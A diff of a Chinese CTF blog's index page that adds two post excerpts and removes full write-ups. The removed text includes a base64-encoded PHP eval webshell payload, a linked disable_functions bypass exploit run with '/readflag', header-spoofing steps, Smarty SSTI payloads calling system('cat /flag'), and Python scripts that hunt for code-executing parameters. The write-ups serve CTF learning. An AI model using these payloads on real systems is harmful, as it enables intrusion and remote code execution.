@@ -272,6 +272,134 @@
 </nav>
       <div class="body-wrap">
   
+    <article id="post-zhishidian" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a  href="/2021/04/15/zhishidian/" class="article-date">
+      <time datetime="2021-04-15T07:02:01.000Z" itemprop="datePublished">2021-04-15</time>
+</a>
+
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a  class="article-title" href="/2021/04/15/zhishidian/">Web常见知识点总结</a>
+    </h1>
+  
+
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+              <p>当然，对于me这种CTF中Loser，这个文章与其说是总结梳理，不如说是<strong>预习笔记</strong>（fuzhizhantieo(<em>////^////</em>)q）。不过我有认真总结一些东西，值得一看的</p><p></p>
+          
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+
+      
+      
+        <p class="article-more-link">
+          <a   href="/2021/04/15/zhishidian/#more">不给你看。哎，就是玩儿!--哼(ˉ(∞)ˉ)唧--(还是来康康吧叭~) >></a>
+        </p>
+      
+      <div class="clearfix"></div>
+    </div>
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+
+
+
+
+  
+    <article id="post-tuzi" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a  href="/2021/04/15/tuzi/" class="article-date">
+      <time datetime="2021-04-15T06:14:25.000Z" itemprop="datePublished">2021-04-15</time>
+</a>
+
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a  class="article-title" href="/2021/04/15/tuzi/">攻防世界练习</a>
+    </h1>
+  
+
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+              <h1>Training-WWW-Robots</h1>
+
+<h2>题目描述：</h2>
+
+<p><img src="/2021/04/15/tuzi/1.png"><br>在这个小小的训练挑战中，您将了解Robots_exclusion_standard。txt文件被网络爬虫程序用来检查他们是否被允许抓取和索引你的网站，或者只是它的一部分。有时这些文件会显示目录结构，而不是保护内容不被抓取。</p>
+          
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+
+      
+      
+        <p class="article-more-link">
+          <a   href="/2021/04/15/tuzi/#more">不给你看。哎，就是玩儿!--哼(ˉ(∞)ˉ)唧--(还是来康康吧叭~) >></a>
+        </p>
+      
+      <div class="clearfix"></div>
+    </div>
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+
+
+
+
+  
     <article id="post-ci" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
@@ -301,7 +429,7 @@
     <div class="article-entry" itemprop="articleBody">
       
           
-        <p>打开题目，代码如下：</p>
+              <p>打开题目，代码如下：</p>
 <pre><code class="prism language-php"><span class="token operator">&lt;</span>title<span class="token operator">&gt;</span>Check_In<span class="token operator">&lt;</span><span class="token operator">/</span>title<span class="token operator">&gt;</span>
 <span class="token delimiter important">&lt;?php</span> 
 <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
@@ -323,14 +451,8 @@
 <span class="token punctuation">&#125;</span>
 <span class="token keyword">new</span> <span class="token class-name">ClassName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 </code></pre> 
-<p>看起来像是魔法函数，不过这道题没有序列化函数，可以通过传参来直接作答:<br>首先传入<code>phpinfo();</code><br>由于这道题是base64解密，所以我们要传入他的base64值:<code>cGhwaW5mbygpOw==</code><br>最终payload：</p>
-<pre><code>?Ginkgo=cGhwaW5mbygpOw==</code></pre>
-
-<p><img src="/2021/04/08/ci/1.png"><br>发现过滤了许多危险函数<br>上传一句话木马：<code>eval(@$_POST['shell']);</code>,base64之后是：<code>ZXZhbChAJF9QT1NUWydzaGVsbCddKTs=</code><br>最终payload：</p>
-<pre><code>?Ginkgo=ZXZhbChAJF9QT1NUWydzaGVsbCddKTs=/code></code></pre>
-
-<p>最后连上菜刀<br><img src="/2021/04/08/ci/2.png"><br>通过readflag来读取flag<br>但完全没思路看大佬wp要注意版本，需要绕过的exp，上传至服务器目录，并执行<br>下载地址：<a target="_blank" rel="noopener" href="https://github.com/mm0r1/exploits/blob/master/php7-gc-bypass/exploit.php">https://github.com/mm0r1/exploits/blob/master/php7-gc-bypass/exploit.php</a><br>文件里面pwn函数后面（）中是要放执行的命令， pwn后面改成：<code>pwn("/readflag");</code>，上传至服务器<br><img src="/2021/04/08/ci/3.png"><br>这里我们无法直接来读取exp，需要传入POST参数：c=include(‘/tmp/exploit.php’)<br>得到flag<br><img src="/2021/04/08/ci/4.png"></p>
-
+<p>看起来像是魔法函数，不过这道题没有序列化函数，可以通过传参来直接作答:</p>
+          
       
     </div>
     
@@ -339,6 +461,10 @@
       
 
       
+      
+        <p class="article-more-link">
+          <a   href="/2021/04/08/ci/#more">不给你看。哎，就是玩儿!--哼(ˉ(∞)ˉ)唧--(还是来康康吧叭~) >></a>
+        </p>
       
       <div class="clearfix"></div>
     </div>
@@ -387,180 +513,8 @@
     <div class="article-entry" itemprop="articleBody">
       
           
-        <p>这是一道非常简单又很狗的抓包题<br>打开题目：<br><img src="/2021/04/07/pig/1.png"><br>admin登录：说我才不是admin<br>那么随便输入账号密码，成功登录：<br><img src="/2021/04/07/pig/2.png"><br>查看源码并没有什么提示<br>重新登陆下bp抓包：<br><img src="/2021/04/07/pig/3.png"><br>发现有个L0g1n.php文件，对其进行访问:<br><img src="/2021/04/07/pig/4.png"><br>总共要99年？再抓包试试，emm，要想抓到还必须登陆后再访问，更狗的是你就算没有重新登录也能抓到个L0g1n.php，害得我搞半天没搞出个结果，就很厉害（gou）：<br>成功抓包后<br><img src="/2021/04/07/pig/5.png"><br>有个time值，将它改成99，(⊙﹏⊙)没任何变化，那改大点<br><img src="/2021/04/07/pig/6.png"></p>
-<pre><code> Sorry, this site is only optimized for those who comes from localhost</code></pre>
-
-<p>那么先xff：<code>X-Forwarded-For: 127.0.0.1</code><br>发现不可以，嫖下大佬的wp，要用到Client-ip来登录：<code>Client-ip: 127.0.0.1</code>(又是一个伪造IP地址的方法)<br><img src="/2021/04/07/pig/7.png"></p>
-<pre><code> Sorry, this site is only optimized for those who come from gem-love.com</code></pre>
-<p>加下来<code>Referer: gem-love.com</code>:<br><img src="/2021/04/07/pig/8.png"></p>
-<pre><code>  Sorry, this site is only optimized for browsers that run on Commodo 64</code></pre>
-<p>浏览器必须来自Commodo 64，修改User-Agent：Commodo 64<br>emmmmm他说nonono不是真正个谷歌浏览器，半天才知道他的全称是Commodore 64，我直接好家伙<br><code>User-Agent：Commodore 64</code><br><img src="/2021/04/07/pig/9.png"></p>
-<pre><code>  Sorry, this site is only optimized for those whose email is root@gem-love.com</code></pre>
-<p>说邮箱不对，修改from：<code>From: <a href="mailto:&#x72;&#111;&#x6f;&#x74;&#64;&#x67;&#101;&#109;&#x2d;&#x6c;&#111;&#x76;&#x65;&#46;&#x63;&#x6f;&#109;">&#x72;&#111;&#x6f;&#x74;&#64;&#x67;&#101;&#109;&#x2d;&#x6c;&#111;&#x76;&#x65;&#46;&#x63;&#x6f;&#109;</a></code><br><img src="/2021/04/07/pig/10.png"></p>
-<pre><code> Sorry, this site is only optimized for those who use the http proxy of y1ng.vip<br> if you dont have the proxy, pls contact us to buy, ￥100/Month</code></pre>
-<p>提示y1ng.vip代理才可以<br><code>Via: y1ng.vip</code>:<br><img src="/2021/04/07/pig/11.png"><br>发现base64编码，解码后得到flag<br><img src="/2021/04/07/pig/12.png"><br>啊终于出来了</p>
-<h4>知识点</h4>
-
-
-<p>下面是大佬总结的Header:请求头参数详解 快来白嫖o(<em>￣▽￣</em>)ブ</p>
-<table>
-<thead>
-<tr><th style="color:black">Header</th><th style="color:black">>解释</th><th style="color:black">>示例</th></tr>
-</thead>
-<tbody>
-<tr>
-<td>Accept</td>
-<td>指定客户端能够接收的内容类型</td>
-<td>Accept: text/plain, text/html,application/json</td>
-</tr>
-<tr>
-<td>Accept-Charset</td>
-<td>浏览器可以接受的字符编码集。</td>
-<td>Accept-Charset: iso-8859-5</td>
-</tr>
-<tr>
-<td>Accept-Encoding</td>
-<td>指定浏览器可以支持的web服务器返回内容压缩编码类型。</td>
-<td>Accept-Encoding: compress, gzip</td>
-</tr>
-<tr>
-<td>Accept-Language</td>
-<td>浏览器可接受的语言</td>
-<td>Accept-Language: en,zh</td>
-</tr>
-<tr>
-<td>Accept-Ranges</td>
-<td>可以请求网页实体的一个或者多个子范围字段</td>
-<td>Accept-Ranges: bytes</td>
-</tr>
-<tr>
-<td>Authorization</td>
-<td>HTTP授权的授权证书</td>
-<td>Authorization: Basic QWxhZGRpbjpvcGVuIHNlc2FtZQ==</td>
-</tr>
-<tr>
-<td>Cache-Control</td>
-<td>指定请求和响应遵循的缓存机制</td>
-<td>Cache-Control: no-cache</td>
-</tr>
-<tr>
-<td>Connection</td>
-<td>表示是否需要持久连接。（HTTP 1.1默认进行持久连接）</td>
-<td>Connection: close</td>
-</tr>
-<tr>
-<td>Cookie</td>
-<td>HTTP请求发送时，会把保存在该请求域名下的所有cookie值一起发送给web服务器。</td>
-<td>Cookie: $Version=1; Skin=new;</td>
-</tr>
-<tr>
-<td>Content-Length</td>
-<td>请求的内容长度</td>
-<td>Content-Length: 348</td>
-</tr>
-<tr>
-<td>Content-Type</td>
-<td>请求的与实体对应的MIME信息</td>
-<td>Content-Type: application/x-www-form-urlencoded</td>
-</tr>
-<tr>
-<td>Date</td>
-<td>请求发送的日期和时间</td>
-<td>Date: Tue, 15 Nov 2010 08:12:31 GMT</td>
-</tr>
-<tr>
-<td>Expect</td>
-<td>请求的特定的服务器行为</td>
-<td>Expect: 100-continue</td>
-</tr>
-<tr>
-<td>From</td>
-<td>发出请求的用户的Email</td>
-<td>From: user@email.com</td>
-</tr>
-<tr>
-<td>Host</td>
-<td>指定请求的服务器的域名和端口号</td>
-<td>Host: www.zcmhi.com</td>
-</tr>
-<tr>
-<td>If-Match</td>
-<td>只有请求内容与实体相匹配才有效</td>
-<td>If-Match: “737060cd8c284d8af7ad3082f209582d”</td>
-</tr>
-<tr>
-<td>If-Modified-Since</td>
-<td>如果请求的部分在指定时间之后被修改则请求成功，未被修改则返回304代码</td>
-<td>If-Modified-Since: Sat, 29 Oct 2010 19:43:31 GMT</td>
-</tr>
-<tr>
-<td>If-None-Match</td>
-<td>如果内容未改变返回304代码，参数为服务器先前发送的Etag，与服务器回应的Etag比较判断是否改变</td>
-<td>If-None-Match: “737060cd8c284d8af7ad3082f209582d”</td>
-</tr>
-<tr>
-<td>If-Range</td>
-<td>如果实体未改变，服务器发送客户端丢失的部分，否则发送整个实体。参数也为Etag</td>
-<td>If-Range: “737060cd8c284d8af7ad3082f209582d”</td>
-</tr>
-<tr>
-<td>If-Unmodified-Since</td>
-<td>只在实体在指定时间之后未被修改才请求成功</td>
-<td>If-Unmodified-Since: Sat, 29 Oct 2010 19:43:31 GMT</td>
-</tr>
-<tr>
-<td>Max-Forwards</td>
-<td>限制信息通过代理和网关传送的时间</td>
-<td>Max-Forwards: 10</td>
-</tr>
-<tr>
-<td>Pragma</td>
-<td>用来包含实现特定的指令</td>
-<td>Pragma: no-cache</td>
-</tr>
-<tr>
-<td>Proxy-Authorization</td>
-<td>连接到代理的授权证书</td>
-<td>Proxy-Authorization: Basic QWxhZGRpbjpvcGVuIHNlc2FtZQ==</td>
-</tr>
-<tr>
-<td>Range</td>
-<td>只请求实体的一部分，指定范围</td>
-<td>Range: bytes=500-999</td>
-</tr>
-<tr>
-<td>Referer</td>
-<td>先前网页的地址，当前请求网页紧随其后,即来路</td>
-<td>Referer:&nbsp;<a href="http://www.zcmhi.com/archives/71.html" target="_blank">http://www.zcmhi.com/archives...</a></td>
-</tr>
-<tr>
-<td>TE</td>
-<td>客户端愿意接受的传输编码，并通知服务器接受接受尾加头信息</td>
-<td>TE: trailers,deflate;q=0.5</td>
-</tr>
-<tr>
-<td>Upgrade</td>
-<td>向服务器指定某种传输协议以便服务器进行转换（如果支持）</td>
-<td>Upgrade: HTTP/2.0, SHTTP/1.3, IRC/6.9, RTA/x11</td>
-</tr>
-<tr>
-<td>User-Agent</td>
-<td>User-Agent的内容包含发出请求的用户信息</td>
-<td>User-Agent: Mozilla/5.0 (Linux; X11)</td>
-</tr>
-<tr>
-<td>Via</td>
-<td>通知中间网关或代理服务器地址，通信协议</td>
-<td>Via: 1.0 fred, 1.1 nowhere.com (Apache/1.1)</td>
-</tr>
-<tr>
-<td>Warning</td>
-<td>关于消息实体的警告信息</td>
-<td>Warn: 199 Miscellaneous warning</td>
-</tr>
-</tbody>
-</table>
-
+              <p>这是一道非常简单又很狗的抓包题<br>打开题目：<br><img src="/2021/04/07/pig/1.png"><br>admin登录：说我才不是admin<br>那么随便输入账号密码，成功登录：<br><img src="/2021/04/07/pig/2.png"></p>
+          
       
     </div>
     
@@ -569,6 +523,10 @@
       
 
       
+      
+        <p class="article-more-link">
+          <a   href="/2021/04/07/pig/#more">不给你看。哎，就是玩儿!--哼(ˉ(∞)ˉ)唧--(还是来康康吧叭~) >></a>
+        </p>
       
       <div class="clearfix"></div>
     </div>
@@ -617,39 +575,13 @@
     <div class="article-entry" itemprop="articleBody">
       
           
-        <h2 id="0x00-知识点">#知识点</h2>
+              <h2 id="0x00-知识点">#知识点</h2>
 <p><strong>SSTI模板注入：</strong><br>
 
 </p><p><img src="/2021/04/06/ssti/1.png"></p>
 <p>模板注入涉及的是服务端Web应用使用模板引擎渲染用户请求的过程</p>
 <p>服务端把用户输入的内容渲染成模板就可能造成SSTI(Server-Side Template Injection)</p>
-<h2 id="#模板引擎">01模板引擎</h2>
-<p>模板引擎（这里特指用于Web开发的模板引擎）是为了使用户界面与业务数据（内容）分离而产生的，它可以生成特定格式的文档，用于网站的模板引擎就会生成一个标准的HTML文档。一些模板引擎：Smarty，Mako，Jinja2，Jade，Velocity，Freemaker和Twig</p>
-<pre><code>
-模板引擎可以让（网站）程序实现界面与数据分离，业务代码与逻辑代码的分离，这大大提升了开发效率，良好的设计也使得代码重用变得更加容易。与此同时，它也扩展了黑客的攻击面。除了常规的 XSS 外，注入到模板中的代码还有可能引发 RCE（远程代码执行）。通常来说，这类问题会在博客，CMS，wiki 中产生。虽然模板引擎会提供沙箱机制，攻击者依然有许多手段绕过它。
-</code></pre>
-<h2 id="#模板渲染">02 模板渲染</h2>
-<p>首先 模板渲染分解为前端渲染和后端渲染，还有浏览器渲染。</p>
-<p>模板只是一种提供给程序来解析的一种语法，换句话说，模板是用于从数据（变量）到实际的视觉表现（HTML代码）这项工作的一种实现手段，而这种手段不论在前端还是后端都有应用。<br>
-通俗点理解：拿到数据，塞到模板里，然后让渲染引擎将赛进去的东西生成 html 的文本，返回给浏览器，这样做的好处展示数据快，大大提升效率。</p>
-<h2 id="#服务端模版注入">03 服务端模版注入</h2>
-<p>服务器执行了我们传过去的数据。每当服务器用模板引擎解析用户的输入时，这类问题都有可能发生。除了常规的输入外，攻击者还可以通过 LFI（文件包含）触发它。模板注入和 SQL 注入的产生原因有几分相似——都是将未过滤的数据传给引擎解析。</p>
-<pre><code>这里模板注入前加“服务端”，这是为了和 jQuery，KnockoutJS 产生的客户端模板注入区别开来。通常的来讲，前者甚至可以让攻击者执行任意代码，而后者只能 XSS。
-</code></pre>
-<h2 id="#模板引擎注入">04 模板引擎注入</h2>
-<p>一些模板引擎：Smarty，Mako，Jinja2，Jade，Velocity，Freemaker和Twig，模板注入是一种注入攻击，可以产生一些特别有趣的影响。对于AngularJS的情况，这可能意味着XSS，并且在服务器端注入的情况下可能意味着远程代码执行。重点来了，不同引擎有不同的测试以及注入方式！</p>
-<p><strong>flask/jinja2模板注入</strong></p>
-<p><strong>PHP/模版引擎Twig注入</strong></p>
-<h2 id="#tplmap">05 tplmap</h2>
-<p>利用tplmap这个工具进行检测是否有模板注入漏洞，用法有点像sqlmap,都是基于python的。</p>
-<h2>06 题目</h2>
-
-<p>查看源码：<br><img src="/2021/04/06/ssti/2.png"><br>发现里面有flag.php文件，打开后界面如下:<br><img src="/2021/04/06/ssti/3.png"><br>存在ip地址，bp抓包，执行如下payload（smarty模板注入）：</p>
-<pre><code>X-Forwarded-For: &#123;&#123;system("ls")&#125;&#125;
-X-Forwarded-For: &#123;&#123;system("cat /flag")&#125;&#125;
-</code></pre>
-<p>得到flag</p>
-
+          
       
     </div>
     
@@ -658,6 +590,10 @@ X-Forwarded-For: &#123;&#123;system("cat /flag")&#125;&#125;
       
 
       
+      
+        <p class="article-more-link">
+          <a   href="/2021/04/06/ssti/#more">不给你看。哎，就是玩儿!--哼(ˉ(∞)ˉ)唧--(还是来康康吧叭~) >></a>
+        </p>
       
       <div class="clearfix"></div>
     </div>
@@ -706,136 +642,8 @@ X-Forwarded-For: &#123;&#123;system("cat /flag")&#125;&#125;
     <div class="article-entry" itemprop="articleBody">
       
           
-        <p>打开题目链接，如下：<br><img src="/2021/04/05/daima/2.png"><br>下载文件：<br><img src="/2021/04/05/daima/1.png"><br>好家伙，这么多个文件，一个一个看完我代码审计应该也就没啥问题了=|=|| <img src="/2021/04/05/daima/3.jpg"><br>这么多的文件其实就是根据一句话木🐎的原理，在大批量的文件中找到你最中意的那个PHP预定义变量$_GET或者$_POST.<br>emmm我无能了，查看大佬的wp，人家是这样正则的：<br><code>get:$_GET[\‘(\w+)\‘]</code><br><code>post:$_POST[\‘(\w+)\‘]</code><br>flag.txt存对应的php和参数信息<br>人家的代码是这样的：</p>
-<pre><code class="prism language-python"><span class="token keyword">import</span> os
-<span class="token keyword">import</span> requests
-<span class="token keyword">import</span> re
-<span class="token keyword">import</span> threading
-<span class="token keyword">import</span> time
-<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&#39;开始时间&#xff1a;  &#39;</span><span class="token operator">&#43;</span>  time<span class="token punctuation">.</span>asctime<span class="token punctuation">(</span> time<span class="token punctuation">.</span>localtime<span class="token punctuation">(</span>time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">)</span>
-s1<span class="token operator">&#61;</span>threading<span class="token punctuation">.</span>Semaphore<span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span>                                            <span class="token comment">#这儿设置最大的线程数</span>
-filePath <span class="token operator">&#61;</span> r<span class="token string">&#34;D:/soft/phpstudy/PHPTutorial/WWW/src/&#34;</span>
-os<span class="token punctuation">.</span>chdir<span class="token punctuation">(</span>filePath<span class="token punctuation">)</span>                                                    <span class="token comment">#改变当前的路径</span>
-requests<span class="token punctuation">.</span>adapters<span class="token punctuation">.</span>DEFAULT_RETRIES <span class="token operator">&#61;</span> <span class="token number">5</span>                                <span class="token comment">#设置重连次数&#xff0c;防止线程数过高&#xff0c;断开连接</span>
-files <span class="token operator">&#61;</span> os<span class="token punctuation">.</span>listdir<span class="token punctuation">(</span>filePath<span class="token punctuation">)</span>
-session <span class="token operator">&#61;</span> requests<span class="token punctuation">.</span>Session<span class="token punctuation">(</span><span class="token punctuation">)</span>
-session<span class="token punctuation">.</span>keep_alive <span class="token operator">&#61;</span> <span class="token boolean">False</span>                                             <span class="token comment"># 设置连接活跃状态为False</span>
-<span class="token keyword">def</span> <span class="token function">get_content</span><span class="token punctuation">(</span><span class="token builtin">file</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
-    s1<span class="token punctuation">.</span>acquire<span class="token punctuation">(</span><span class="token punctuation">)</span>                                                
-    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&#39;trying   &#39;</span><span class="token operator">&#43;</span><span class="token builtin">file</span><span class="token operator">&#43;</span> <span class="token string">&#39;     &#39;</span><span class="token operator">&#43;</span> time<span class="token punctuation">.</span>asctime<span class="token punctuation">(</span> time<span class="token punctuation">.</span>localtime<span class="token punctuation">(</span>time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">)</span>
-    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token builtin">file</span><span class="token punctuation">,</span>encoding<span class="token operator">&#61;</span><span class="token string">&#39;utf-8&#39;</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>                            <span class="token comment">#打开php文件&#xff0c;提取所有的$_GET和$_POST的参数</span>
-            gets <span class="token operator">&#61;</span> <span class="token builtin">list</span><span class="token punctuation">(</span>re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span><span class="token string">&#39;\$_GET\[\&#39;(.*?)\&#39;\]&#39;</span><span class="token punctuation">,</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
-            posts <span class="token operator">&#61;</span> <span class="token builtin">list</span><span class="token punctuation">(</span>re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span><span class="token string">&#39;\$_POST\[\&#39;(.*?)\&#39;\]&#39;</span><span class="token punctuation">,</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
-    data <span class="token operator">&#61;</span> <span class="token punctuation">&#123;<!-- --></span><span class="token punctuation">&#125;</span>                                                        <span class="token comment">#所有的$_POST</span>
-    params <span class="token operator">&#61;</span> <span class="token punctuation">&#123;<!-- --></span><span class="token punctuation">&#125;</span>                                                        <span class="token comment">#所有的$_GET</span>
-    <span class="token keyword">for</span> m <span class="token keyword">in</span> gets<span class="token punctuation">:</span>
-        params<span class="token punctuation">[</span>m<span class="token punctuation">]</span> <span class="token operator">&#61;</span> <span class="token string">&#34;echo &#39;xxxxxx&#39;;&#34;</span>
-    <span class="token keyword">for</span> n <span class="token keyword">in</span> posts<span class="token punctuation">:</span>
-        data<span class="token punctuation">[</span>n<span class="token punctuation">]</span> <span class="token operator">&#61;</span> <span class="token string">&#34;echo &#39;xxxxxx&#39;;&#34;</span>
-    url <span class="token operator">&#61;</span> <span class="token string">&#39;http://127.0.0.1/src/&#39;</span><span class="token operator">&#43;</span><span class="token builtin">file</span>
-    req <span class="token operator">&#61;</span> session<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">&#61;</span>data<span class="token punctuation">,</span> params<span class="token operator">&#61;</span>params<span class="token punctuation">)</span>            <span class="token comment">#一次性请求所有的GET和POST</span>
-    req<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>                                                <span class="token comment"># 关闭请求  释放内存</span>
-    req<span class="token punctuation">.</span>encoding <span class="token operator">&#61;</span> <span class="token string">&#39;utf-8&#39;</span>
-    content <span class="token operator">&#61;</span> req<span class="token punctuation">.</span>text
-    <span class="token comment">#print(content)</span>
-    <span class="token keyword">if</span> <span class="token string">&#34;xxxxxx&#34;</span> <span class="token keyword">in</span> content<span class="token punctuation">:</span>                                    <span class="token comment">#如果发现有可以利用的参数&#xff0c;继续筛选出具体的参数</span>
-        flag <span class="token operator">&#61;</span> <span class="token number">0</span>
-        <span class="token keyword">for</span> a <span class="token keyword">in</span> gets<span class="token punctuation">:</span>
-            req <span class="token operator">&#61;</span> session<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token operator">&#43;</span><span class="token string">&#39;?%s&#61;&#39;</span><span class="token operator">%</span>a<span class="token operator">&#43;</span><span class="token string">&#34;echo &#39;xxxxxx&#39;;&#34;</span><span class="token punctuation">)</span>
-            content <span class="token operator">&#61;</span> req<span class="token punctuation">.</span>text
-            req<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>                                                <span class="token comment"># 关闭请求  释放内存</span>
-            <span class="token keyword">if</span> <span class="token string">&#34;xxxxxx&#34;</span> <span class="token keyword">in</span> content<span class="token punctuation">:</span>
-                flag <span class="token operator">&#61;</span> <span class="token number">1</span>
-                <span class="token keyword">break</span>
-        <span class="token keyword">if</span> flag <span class="token operator">!&#61;</span> <span class="token number">1</span><span class="token punctuation">:</span>
-            <span class="token keyword">for</span> b <span class="token keyword">in</span> posts<span class="token punctuation">:</span>
-                req <span class="token operator">&#61;</span> session<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">&#61;</span><span class="token punctuation">&#123;<!-- --></span>b<span class="token punctuation">:</span><span class="token string">&#34;echo &#39;xxxxxx&#39;;&#34;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
-                content <span class="token operator">&#61;</span> req<span class="token punctuation">.</span>text
-                req<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>                                                <span class="token comment"># 关闭请求  释放内存</span>
-                <span class="token keyword">if</span> <span class="token string">&#34;xxxxxx&#34;</span> <span class="token keyword">in</span> content<span class="token punctuation">:</span>
-                    <span class="token keyword">break</span>
-        <span class="token keyword">if</span> flag <span class="token operator">&#61;&#61;</span> <span class="token number">1</span><span class="token punctuation">:</span>                                                    <span class="token comment">#flag用来判断参数是GET还是POST&#xff0c;如果是GET&#xff0c;flag&#61;&#61;1&#xff0c;则b未定义&#xff1b;如果是POST&#xff0c;flag为0&#xff0c;</span>
-            param <span class="token operator">&#61;</span> a
-        <span class="token keyword">else</span><span class="token punctuation">:</span>
-            param <span class="token operator">&#61;</span> b
-        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&#39;找到了利用文件&#xff1a; &#39;</span><span class="token operator">&#43;</span><span class="token builtin">file</span><span class="token operator">&#43;</span><span class="token string">&#34;  and 找到了利用的参数&#xff1a;%s&#34;</span> <span class="token operator">%</span>param<span class="token punctuation">)</span>
-        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&#39;结束时间&#xff1a;  &#39;</span> <span class="token operator">&#43;</span> time<span class="token punctuation">.</span>asctime<span class="token punctuation">(</span>time<span class="token punctuation">.</span>localtime<span class="token punctuation">(</span>time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
-    s1<span class="token punctuation">.</span>release<span class="token punctuation">(</span><span class="token punctuation">)</span>
-
-<span class="token keyword">for</span> i <span class="token keyword">in</span> files<span class="token punctuation">:</span>                                                            <span class="token comment">#加入多线程</span>
-   t <span class="token operator">&#61;</span> threading<span class="token punctuation">.</span>Thread<span class="token punctuation">(</span>target<span class="token operator">&#61;</span>get_content<span class="token punctuation">,</span> args<span class="token operator">&#61;</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
-   t<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>
-</code></pre> 
-<p>emmmmm 其实看半天也没看出个所以然，这个脚本大概四分钟便可以找到参数的利用点，主要是因为这个脚本很巧妙的将所有参数一起传入进去，如果发现可以利用再细分找具体的参数。下去再研究研究<br>对于这道题，也可以采用如下代码：</p>
-<pre><code class="language-python">import requests
-import os
-import re
-import threading
-import time
-
-requests.adapters.DEFAULT_RETRIES = 8 #设置重连次数，防止线程数过高，断开连接
-session = requests.Session()
-session.keep_alive = False # 设置连接活跃状态为False
-sem=threading.Semaphore(30) # 设置最大线程数 ,别设置太大，不然还是会崩的挺厉害的，跑到关键的爆炸，心态就爆炸了
-
-url = &quot;http://7cfcd16d-dd76-4421-8906-b9c234c18daf.node3.buuoj.cn/&quot;
-
-# 下载的源文件路径,根据自己的路径修改
-path = r&quot;C:\Users\lenovo\Desktop\www\src\\&quot;
-
-
-rrGET = re.compile(r&quot;\$_GET\[\‘(\w+)\‘\]&quot;) #匹配get参数
-
-rrPOST = re.compile(r&quot;\$_POST\[\‘(\w+)\‘\]&quot;) #匹配post参数
-
-fileNames = os.listdir(path) # 列出目录中的文件,以每个文件都开一个线程
-
-flags = [] #用于存所有的注入点信息,下面的flag表示注入点的信息，php文件名和参数名
-
-local_file = open(&quot;flag.txt&quot;,&quot;w&quot;,encoding=&quot;utf-8&quot;)
-
-def run(fileName):
-    with sem:
-        file = open( path + fileName, ‘r‘,encoding=‘utf-8‘ )
-        content = file.read()
-        print(&quot;[+]checking:%s&quot; % fileName )
-
-        #测试get的参数
-        for i in rrGET.findall(content):
-            r = session.get( url + &quot;%s?%s=%s&quot; % (fileName,i,&quot;echo h3zh1;&quot;) )
-            if &quot;h3zh1&quot; in r.text:
-                flag = &quot;You Find it in GET fileName = %s and param = %s \n&quot; % ( fileName, i )
-                print(flag)
-                local_file.write(flag)
-                #return 
-
-        #测试post的参数
-        #for i in rrPOST.findall(content):
-        #    r = session.post( url + fileName , data = &#123; i : &quot;echo h3zh1;&quot; &#125; )
-        #    if &quot;h3zh1&quot; in r.text:
-        #        flag = &quot;You Find it in POST: fileName = %s and param = %s \n&quot; % ( fileName, i )
-        #        print(flag)
-        #        local_file.writelines(flag)
-
-if __name__ == ‘__main__‘:
-    start_time = time.time() # 开始时间
-    print(&quot;[start]程序开始:&quot;+str(start_time))
-
-    thread_list = []
-    for fileName in fileNames:
-        t = threading.Thread( target=run , args=(fileName,) )
-        thread_list.append(t)
-    for t in thread_list:
-        t.start()
-    for t in thread_list:
-        t.join()
-
-    end_time = time.time()
-    local_file.close() #关文件
-    print(&quot;[end]程序结束:用时:&quot;+str(end_time-start_time))
-</code></pre>
